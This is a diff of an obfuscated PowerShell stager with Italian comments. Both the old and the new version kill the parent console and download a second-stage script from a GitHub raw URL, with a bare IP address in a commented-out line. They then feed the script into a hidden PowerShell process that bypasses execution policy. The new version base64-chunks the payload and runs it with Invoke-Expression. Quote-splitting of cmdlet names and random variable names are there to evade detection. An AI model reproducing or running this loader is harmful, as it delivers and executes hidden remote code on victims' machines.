@@ -1,40 +1,41 @@
-# 🔥 K''ILL CMD PARENT PROCESS
-$97503ecc658d471eb81645bd1a485549= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Sel''e''ct -Expand ParentProcessId) 2>$null
-if ($97503ecc658d471eb81645bd1a485549) { Sto''p-P''ro''c''e''s''s -Id $97503ecc658d471eb81645bd1a485549 -Force -ErrorAction SilentlyContinue }
-
-# $ea8ea90af6dc4018b83708ee6abf64e6 = "http://151.61.206.201/second.txt";
-$ea8ea90af6dc4018b83708ee6abf64e6= "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt";
-$7c372038fe01419986ecefafc91633b5= (New-Object Net.WebClient).DownloadString($ea8ea90af6dc4018b83708ee6abf64e6);
-$cd460ec9a7dc4cb48617ea1e749fc1a9= $7c372038fe01419986ecefafc91633b5 -split "`r?`n";
-
-$6b7897cb45384fcd8bdf60dcf59445aa= New''-Obje''ct System.Diagnostics.ProcessStartInfo;
-$6b7897cb45384fcd8bdf60dcf59445aa.FileName = "powershell.exe";
-$6b7897cb45384fcd8bdf60dcf59445aa.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
-$6b7897cb45384fcd8bdf60dcf59445aa.UseShellExecute = $false;
-$6b7897cb45384fcd8bdf60dcf59445aa.RedirectStandardInput = $true;
-$6b7897cb45384fcd8bdf60dcf59445aa.RedirectStandardOutput = $true;
-$6b7897cb45384fcd8bdf60dcf59445aa.RedirectStandardError = $true;
-$6b7897cb45384fcd8bdf60dcf59445aa.CreateNoWindow = $true;
-
-$afdf6cb5a0574346b436be03e27437c7= [System.Diagnostics.Process]::Start($6b7897cb45384fcd8bdf60dcf59445aa);
-St''a''r''t-''Sl''eep -Seconds 1.2;
-
-# 1. INIT error handling
-$afdf6cb5a0574346b436be03e27437c7.StandardInput.WriteLine('$94429f72d7504f7a839b629c17ae0d8f = "SilentlyContinue"');
-$afdf6cb5a0574346b436be03e27437c7.StandardInput.Flush();
-St''a''rt''-''S''l''e''ep -Milliseconds 200;
-
-# 2. INVIO script line-by-line
-foreach ($line in $cd460ec9a7dc4cb48617ea1e749fc1a9) {
-    if ($line.Trim()) {
-        $afdf6cb5a0574346b436be03e27437c7.StandardInput.WriteLine($line.TrimEnd());
-        $afdf6cb5a0574346b436be03e27437c7.StandardInput.Flush();
-        Star''t-S''l''e''ep -Milliseconds (50..150 | Ge''t''-Ran''d''o''m);
-    }
+$a4e360c2f916481787a2f35f4e97d823 = $true
+$d418d6f6119049639a22cf714bd6ce4d = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt"
+$85f6b240ec6649c191ab6d09465ea080 = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Se''l''ec''t -Expand ParentProcessId) 2>$null
+if ($85f6b240ec6649c191ab6d09465ea080) { S''t''o''p-''P''ro''c''e''ss -Id $85f6b240ec6649c191ab6d09465ea080 -Force -ErrorAction SilentlyContinue }
+$af734e54254940ccadd26662e5454a25 = (New-Object Net.WebClient).DownloadString($d418d6f6119049639a22cf714bd6ce4d)
+$9a05bc9c00a6433cb7a1a3390964aebc = New-''Object System.Diagnostics.ProcessStartInfo
+$9a05bc9c00a6433cb7a1a3390964aebc.FileName = "powershell.exe"
+$9a05bc9c00a6433cb7a1a3390964aebc.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass"
+$9a05bc9c00a6433cb7a1a3390964aebc.UseShellExecute = $false
+$9a05bc9c00a6433cb7a1a3390964aebc.RedirectStandardInput = $true
+$9a05bc9c00a6433cb7a1a3390964aebc.RedirectStandardOutput = $true
+$9a05bc9c00a6433cb7a1a3390964aebc.RedirectStandardError = $true
+$9a05bc9c00a6433cb7a1a3390964aebc.CreateNoWindow = $true
+$0a80d487798e48eba901e8b0745a5fd6 = [System.Diagnostics.Process]::Start($9a05bc9c00a6433cb7a1a3390964aebc)
+$0a80d487798e48eba901e8b0745a5fd6.BeginOutputReadLine()
+$0a80d487798e48eba901e8b0745a5fd6.BeginErrorReadLine()
+S''t''a''r''t-S''leep -Seconds 1.2
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.WriteLine('$6c67b6e2991445279d6084076d06e25e = "SilentlyContinue"')
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.Flush()
+S''t''ar''t-Slee''p -Milliseconds 200
+$efd4e1d0c3054de7829b440dd2802e5e = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($af734e54254940ccadd26662e5454a25))
+$6a241576e64848e7b029a2b30d6107df = 2000
+$b6a8abd0e89b4f56a48393c3a94457e2 = [Math]::Ceiling($efd4e1d0c3054de7829b440dd2802e5e.Length / $6a241576e64848e7b029a2b30d6107df)
+if (-not $a4e360c2f916481787a2f35f4e97d823) { Wri''t''e''-Host "[*] Invio script in $b6a8abd0e89b4f56a48393c3a94457e2 chunk da $6a241576e64848e7b029a2b30d6107df char (totale B64: $($efd4e1d0c3054de7829b440dd2802e5e.Length))" -ForegroundColor Cyan }
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.WriteLine('$4c02615daca444a68d28282474a89db6 = ""')
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.Flush()
+S''t''ar''t''-Sl''e''e''p -Milliseconds 150
+for ($bcee85413ee44b138f61c436e58706a3 = 0; $bcee85413ee44b138f61c436e58706a3 -lt $efd4e1d0c3054de7829b440dd2802e5e.Length; $bcee85413ee44b138f61c436e58706a3 += $6a241576e64848e7b029a2b30d6107df) {
+    $6571b91a172d42fba59806c5a678399a = $efd4e1d0c3054de7829b440dd2802e5e.Substring($bcee85413ee44b138f61c436e58706a3, [Math]::Min($6a241576e64848e7b029a2b30d6107df, $efd4e1d0c3054de7829b440dd2802e5e.Length - $bcee85413ee44b138f61c436e58706a3))
+    $263afb7fbcf749e69fa51e57a55f4176 = [Math]::Floor($bcee85413ee44b138f61c436e58706a3 / $6a241576e64848e7b029a2b30d6107df) + 1
+    if (-not $a4e360c2f916481787a2f35f4e97d823) { W''ri''te''-''Ho''s''t "[$263afb7fbcf749e69fa51e57a55f4176/$b6a8abd0e89b4f56a48393c3a94457e2] Invio chunk..." -ForegroundColor Yellow }
+    $0a80d487798e48eba901e8b0745a5fd6.StandardInput.WriteLine('$4c02615daca444a68d28282474a89db6 += "' + $6571b91a172d42fba59806c5a678399a + '"')
+    $0a80d487798e48eba901e8b0745a5fd6.StandardInput.Flush()
+    St''art-''S''le''e''p -Milliseconds 100
 }
-
-# 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
-$afdf6cb5a0574346b436be03e27437c7.StandardInput.WriteLine('');  # Nuova riga
-$afdf6cb5a0574346b436be03e27437c7.StandardInput.Flush();
-S''ta''rt''-''Sl''e''e''p -Milliseconds 500;
-
+if (-not $a4e360c2f916481787a2f35f4e97d823) { W''rite-H''o''st "[*] Esecuzione script..." -ForegroundColor Green }
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.WriteLine('[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($4c02615daca444a68d28282474a89db6)) | I''n''v''o''k''e''-''Ex''p''r''e''s''s''i''o''n')
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.Flush()
+Star''t-''S''l''ee''p -Milliseconds 500
+$0a80d487798e48eba901e8b0745a5fd6.StandardInput.Close()
+if (-not $a4e360c2f916481787a2f35f4e97d823) { W''rite-''Host "[+] Done." -ForegroundColor Green }
